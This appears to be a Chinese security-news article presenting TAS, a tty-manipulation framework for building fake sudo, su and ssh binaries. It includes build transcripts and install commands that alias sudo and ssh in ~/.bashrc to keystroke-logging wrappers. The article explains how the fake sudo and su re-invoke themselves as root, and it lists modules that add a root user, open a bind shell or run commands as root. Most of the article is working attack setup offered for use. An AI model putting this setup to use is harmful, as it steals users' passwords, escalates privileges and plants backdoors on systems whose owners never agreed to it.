![](https://image.3001.net/images/20200206/1580982243_5e3bdfe30f8a0.jpg!small)

**TAS是一款轻量级框架，在它的帮助下，研究人员可以轻松修改tty并创建伪造的代码。**

该框架拥有三个主要函数，即tas_execv、tas_forkpty和tas_tty_loop：

> 1、tas_execv：这个函数的作用跟execv类似，但是它并不会重新执行当前代码，这对于创建伪造代码来说非常有用；
>
> 2、tas_forkpty：这个函数跟forkpty一样，不过它会自动填充自定义结构体，检查forkpty操作页并获取详细信息；
>
>
> 3、tas_tty_loop：这个函数负责对tty进行修改操作，我们可以针对输入和输出数据设置钩子函数，这样就可以获取到用户输入的击键数据或修改终端输出结果（[
> _leet-shell_](https://www.freebuf.com/wp-> admin/post.php?post=226575&action=edit#leet-shell)）。

如果你需要深入了解TAS的工作机制，可以通过查看本项目的“tas/fakebins/fun”目录以获取更多信息。

## 伪造代码

通过修改PATH环境变量，或使用Bash的Aliases（或其他支持Aliases的Shell），你就可以直接运行其他程序，而无需运行用户真正要运行的那个程序。这样一来，我们就可以捕捉到目标用户的键盘击键数据，并修改命令行来改变原始程序的行为。

修改某些程序的命令行，例如sudo和su，将会帮助我们在目标设备上实现提权。

为了方便大家理解和使用TAS，我专门创建了三个示例程序来演示该框架的功能，即sudo、su和generic-keylogger。

### generic-keylogger

generic-keylogger，正如其名字所示，它可以被当作键盘记录器来使用，而我们在这里主要利用它来获取类似ssh和mysql这类程序的密码。

### sudo/su

当然了，它也可以被当作键盘记录器来使用，或者你也能够以root权限来运行某些功能模块（通过修改命令行）。

Cmd修改步骤

首先，目标用户输入并运行下列命令：

    
    
    sudo cmd

此时，实际运行的命令如下：

    
    
    fakesudo cmd

其中，fakesudo将会执行下列命令：

    
    
    sudo fakesudo cmd

以root权限运行上述命令之后，fakesudo将会创建一个子进程来执行其中的部分功能模块，并且在进程的主PID中，它会运行原始命令。注意，如果用户运行的命令是sudo
cmd [args]的话，fakesudo才会修改命令，如果添加了额外的命令运行参数，那么命令将无法被修改。

如果使用的是su，那么情况跟sudo的差不多。

首先，目标用户输入并运行下列命令：

    
    
    Su -
此时，实际运行的命令如下：

    
    
    fakesu -
其中，fakesudo将会执行下列命令：

    
    
    su - -c fakesu

以root权限运行上述命令之后，fakesu将会创建一个子进程来执行其中的部分功能模块，并且在进程的主PID中，它会运行bash -i命令。

注意：只有当用户运行su或su -时，fakesu才会修改命令，如果如果添加了额外的命令运行参数，那么命令将无法被修改。

## 功能模块

目前，该工具只有下列三个功能模块：

> 1、add-root-user：使用/etc/passwd中的密码创建一个root用户；
>
> 2、bind-shell：监听传入的连接，并生成一个tty shell；
>
> 3、system：以root权限执行命令；

### 项目下载

广大研究人员可以使用下列命令将项目源码克隆至本地：

    
    
    git clone https://github.com/hc0d3r/tas.git

### 项目构建

首先，我们需要构建项目基库：

    
    
    $ make
      CC .obj/globals.o
      CC .obj/getinode.o
      CC .obj/tas-execv.o
      CC .obj/tty.o
      CC .obj/xreadlink.o
      AR .obj/libtas.a

接下来，我们还需要运行下列命令构建sudo、su和generic-keylogger：

    
    
    make [target-bin]

构建样例：

    
    
    $ make su
    make[1]: Entering directory '/home/test/tas/fakebins/su'
    [+] configuring fakesu ...
    enable keylogger? [y/N] y
    number of lines to record [empty = store all]:
    logfile (default: /tmp/.keys.txt):
    use some FUN modules? [y/N] n
    [+] configuration file created in /home/test/tas/fakebins/su/config.h
      CC su
    make[1]: Leaving directory '/home/test/tas/fakebins/su'

## 工具使用样例

### 创建一个fakessh

编译：

    
    
    $ make generic-keylogger
    make[1]: Entering directory '/home/test/tas/fakebins/generic-keylogger'
    [+] configuring generic-keylogger ...
    number of lines to record [empty = store all]: 3
    logfile (default: /tmp/.keys.txt):
    [+] configuration file created in /home/test/tas/fakebins/generic-keylogger/config.h
      CC generic-keylogger
    make[1]: Leaving directory '/home/test/tas/fakebins/generic-keylogger'

安装：

    
    
    $ mkdir ~/.bin
    $ cp generic-keylogger ~/.bin/ssh
    $ echo "alias ssh='$HOME/.bin/ssh'" >> ~/.bashrc

演示：

### 使用bind-shell模块

编译：

    
    
    make[1]: Entering directory '/home/test/tas/fakebins/sudo'
    [+] configuring fakesudo ...
    enable keylogger? [y/N] n
    use some FUN modules? [y/N] y
    [1] add-root-user
    [2] bind-shell
    [3] system
    [4] cancel
    > 2
    listen port (Default: 1337): 5992
    [+] configuration file created in /home/test/tas/fakebins/sudo/config.h
      CC sudo
    make[1]: Leaving directory '/home/test/tas/fakebins/sudo'

安装：

    
    
    $ cp sudo ~/.sudo
    $ echo "alias sudo='$HOME/.sudo'" >> ~/.bashrc

演示：

![](https://image.3001.net/images/20200206/1580982627_5e3be163956a6.gif!small)

### leet-shell

在leet-shell这个使用样例中，你可以修改tty输出，它将允许你使用bash（类似1337 h4x0r）：

    
    
    [test@alfheim tas]$ make fun/leet-shell
      CC fun/leet-shell
    [t3st@alfheim tas]$ fun/leet-shell
    SP4WN1NG L33T SH3LL H3R3 !!!
    [t3st@4lfh31m t4s]$ 3ch0 'l33t sh3ll 1s l33t !!!'
    l33t sh3ll 1s l33t !!!

## 项目地址

> TAS：【[ _GitHub传送门_](https://github.com/hc0d3r/tas)】

 *** 参考来源：[
_hc0d3r_](https://github.com/hc0d3r/tas)，FB小编Alpha_h4ck编译，转载请注明来自FreeBuf.COM**

